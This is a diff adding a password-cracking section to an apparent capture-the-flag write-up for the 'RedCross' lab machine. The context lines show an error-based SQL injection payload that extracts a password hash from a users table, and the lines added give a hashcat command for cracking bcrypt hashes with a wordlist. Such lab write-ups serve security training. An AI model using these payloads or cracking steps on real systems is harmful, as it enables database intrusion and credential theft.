@@ -160,3 +160,11 @@ Machine IP: 10.10.10.113 - Debian
   - Query5 : (User:guest - Password) - `') and extractvalue(0x0a,concat(0x0a,substring((select password from redcross.users LIMIT 4,1) FROM 32)))-- -`
 ![image](https://user-images.githubusercontent.com/83878909/229369808-d6c53a4e-207e-45d9-ac72-c0ee947107e6.png)
   - Creds: `$2y$10$U16O2Ylt/uFtzlVbDIzJ8us9ts8f9ITWoPAWcUfK585sZue03YBAi`
+
+## Crack Hashes
+```CSS
+▶ hashcat -m 3200 --username hashes.txt /usr/share/wordlists/rockyou.txt
+```
+- hashes.txt
+![image](https://user-images.githubusercontent.com/83878909/229371164-25bf449a-6810-411a-bdbd-f2b3fe813133.png)
+
